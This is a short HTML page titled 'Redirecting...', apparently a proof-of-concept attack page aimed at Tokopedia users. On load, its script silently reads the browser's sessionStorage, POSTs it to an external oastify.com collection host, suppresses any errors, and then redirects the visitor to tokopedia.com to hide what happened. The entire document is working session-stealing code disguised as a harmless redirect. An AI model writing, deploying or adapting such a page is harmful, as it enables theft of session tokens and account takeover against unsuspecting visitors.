<!DOCTYPE html>
<html>
  <body>
    <h1>Redirecting...</h1>
    <script>
      try {
        const session = JSON.stringify(sessionStorage);
        fetch("https://bixt314qp9rfkgz3ld135me2ptvljc71.oastify.com", {
          method: "POST",
          mode: "no-cors",
          body: session,
        });
      } catch (e) {
        // fail silently
      }
      // Optional redirect
      setTimeout(() => {
        window.location.href = "https://tokopedia.com";
      }, 500);
    </script>
  </body>
</html>
